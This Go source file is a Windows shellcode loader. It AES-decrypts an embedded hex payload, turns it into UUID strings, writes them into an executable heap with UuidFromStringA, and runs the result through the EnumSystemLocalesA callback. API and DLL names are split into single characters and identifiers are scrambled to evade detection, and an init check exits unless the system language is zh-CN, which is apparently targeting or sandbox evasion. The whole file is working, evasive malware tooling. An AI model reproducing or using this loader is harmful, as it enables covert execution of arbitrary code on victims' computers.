package main

import (
	"bytes"
	"crypto/aes"
	"encoding/binary"
	"encoding/hex"
	"flag"
	"fmt"
	"github.com/google/uuid"
	"golang.org/x/sys/windows"
	"log"
	"os"
	"unsafe"
)

func PPZZXXXToUUID(PPZZXXX []byte) ([]string, error) {
	// Pad PPZZXXX to 16 bytes, the size of a UUID
	if 16-len(PPZZXXX)%16 > 16 {
		pad := bytes.Repeat([]byte{byte(0x90)}, 16-len(PPZZXXX)%16)
		PPZZXXX = append(PPZZXXX, pad...)
	}
	var uuids []string
	for i := 0; i < len(PPZZXXX); i += 16 {
		var uuidBytes []byte
		// This seems unecessary or overcomplicated way to do this
		// Add first 4 bytes
		buf := make([]byte, 4)
		binary.LittleEndian.PutUint32(buf, binary.BigEndian.Uint32(PPZZXXX[i:i+4]))
		uuidBytes = append(uuidBytes, buf...)

		// Add next 2 bytes
		buf = make([]byte, 2)
		binary.LittleEndian.PutUint16(buf, binary.BigEndian.Uint16(PPZZXXX[i+4:i+6]))
		uuidBytes = append(uuidBytes, buf...)

		// Add next 2 bytes
		buf = make([]byte, 2)
		binary.LittleEndian.PutUint16(buf, binary.BigEndian.Uint16(PPZZXXX[i+6:i+8]))
		uuidBytes = append(uuidBytes, buf...)

		// Add remaining
		uuidBytes = append(uuidBytes, PPZZXXX[i+8:i+16]...)

		u, err := uuid.FromBytes(uuidBytes)
		if err != nil {
			return nil, fmt.Errorf("there was an error converting bytes into a UUID:\n%s", err)
		}

		uuids = append(uuids, u.String())
	}
	return uuids, nil
}
func AESDecrypt(encrypted []byte, key []byte) (decrypted []byte) {
	cipher, _ := aes.NewCipher(generateKey(key))
	decrypted = make([]byte, len(encrypted))
	//
	for bs, be := 0, cipher.BlockSize(); bs < len(encrypted); bs, be = bs+cipher.BlockSize(), be+cipher.BlockSize() {
		cipher.Decrypt(decrypted[bs:be], encrypted[bs:be])
	}

	trim := 0
	if len(decrypted) > 0 {
		trim = len(decrypted) - int(decrypted[len(decrypted)-1])
	}
	return decrypted[:trim]
}
func generateKey(key []byte) (genKey []byte) {
	genKey = make([]byte, 16)
	copy(genKey, key)
	for i := 16; i < len(key); {
		for j := 0; j < 16 && i < len(key); j, i = j+1, i+1 {
			genKey[j] ^= key[i]
		}
	}
	return genKey
}

var (
	code string
	key  string
)

func init() {
	a, _ := windows.GetUserPreferredUILanguages(windows.MUI_LANGUAGE_NAME)
	if a[0] != "zh-CN" {
		//fmt.Printf("err")
		os.Exit(1)
	}
}
func main() {
	aaakey := []byte(key)
	//ncode, _ := Decrypt(code, key)
	//log.Printf("\nok")
	//log.Println("QQ:", qq, "ip:", ip, "时间:", time, "用户名:", name)
	//var pppp []byte = []byte(code)
	LLLL, _ := hex.DecodeString(code)
	xxxxx := flag.Bool("xxxxx", false, "Enable xxxxx output")
	QQXZXX := flag.Bool("QQXZXX", false, "Enable QQXZXX output")
	flag.Parse()

	// Pop Calc PPZZXXX
	PPZZXXX := AESDecrypt(LLLL, aaakey)

	// Convert PPZZXXX to UUIDs
	if *QQXZXX {
		fmt.Println("[QQXZXX]Converting PPZZXXX to slice of UUIDs")
	}

	uuids, err := PPZZXXXToUUID(PPZZXXX)
	fmt.Println(uuids)
	if err != nil {
		log.Fatal(err.Error())
	}
	OOOOOOOOOO := windows.NewLazySystemDLL("k"+"e"+"r"+"n"+"e"+"l"+"3"+"2")
	OOOOOOOOO := windows.NewLazySystemDLL("R"+"p"+"c"+"r"+"t"+"4"+".d"+"l"+"l")
	OOOOOOO := OOOOOOOOOO.NewProc("H"+"e"+"a"+"p"+"C"+"r"+"e"+"a"+"t"+"e")
	OOOOOO := OOOOOOOOOO.NewProc("H"+"e"+"a"+"p"+"A"+"l"+"l"+"o"+"c")
	ooooo := OOOOOOOOOO.NewProc("E"+"n"+"u"+"m"+"S"+"y"+"s"+"t"+"e"+"m"+"L"+"o"+"c"+"a"+"l"+"e"+"s"+"A")
	PPPPP := OOOOOOOOO.NewProc("U"+"u"+"i"+"d"+"F"+"r"+"o"+"m"+"S"+"t"+"r"+"i"+"n"+"g"+"A")
	QQQQQ, _, _ := OOOOOOO.Call(0x00040000, 0, 0)
	// Allocate the heap
	addr, _, _ := OOOOOO.Call(QQQQQ, 0, 0x00100000)


	addrPtr := addr
	for _, uuid := range uuids {
		// Must be a RPC_CSTR which is null terminated
		u := append([]byte(uuid), 0)
		// Only need to pass a pointer to the first character in the null terminated string representation of the UUID
		rpcStatus, _, err := PPPPP.Call(uintptr(unsafe.Pointer(&u[0])), addrPtr)

		// RPC_S_OK = 0
		if rpcStatus != 0 {
			log.Fatal(fmt.Sprintf("There was an error calling PPPPPA:\r\n%s", err))
		}
		addrPtr += 16
	}
	if *xxxxx {
		fmt.Println("Completed loading UUIDs to memory with PPPPPA")
	}

	/*
		BOOL ooooo(
		LOCALE_ENUMPROCA lpLocaleEnumProc,
		DWORD            dwFlags
		);
	*/
	// Execute PPZZXXX
	if *QQXZXX {
		fmt.Println("[QQXZXX]Calling ooooo to execute")
	}
	ret, _, err := ooooo.Call(addr, 0)
	if ret == 0 {
		log.Fatal(fmt.Sprintf("ooooo GetLastError: %s", err))
	}
	if *xxxxx {
		fmt.Println("Executed")
	}
}
